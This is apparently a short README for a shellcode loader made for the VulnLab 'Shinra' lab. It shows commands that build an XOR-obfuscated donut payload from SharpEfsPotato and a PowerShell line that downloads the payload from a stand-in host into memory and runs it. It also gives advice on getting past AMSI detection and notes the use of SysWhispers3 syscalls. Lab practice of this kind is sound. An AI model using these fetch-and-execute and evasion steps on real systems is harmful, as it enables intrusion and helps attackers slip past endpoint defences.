# ShinraLoader
Shellcode loader that I created to use for VulnLab's Shinra.
Requires donut: https://github.com/TheWover/donut
```sh
pip install donut-shellcode
```
Usage: Create your payload
```sh
python donutGenerator.py -i SharpEfsPotato.exe -b 1 --args='-p calc.exe' -x "HelloWorld"
```
Host the file on a web server and use the loader to download into memory and execute
```powershell
.\Loader.exe /p:http://example.com/payload.bin /x:HelloWorld
```
Omit -x and /x: if not using XOR functionality.

Donut doesn't bypass amsi anymore (AMSI_Patch_T.B12), so I recommend making sure your payloads don't trigger it before sending them off. Add the flag -b 1 to avoid your shellcode being created with the now non-functional amsi-bypass.

Inspired by my teammate Mane: https://github.com/manesec/shellcodeloader4mane
Using syswhispers3 syscalls: https://github.com/klezVirus/SysWhispers3
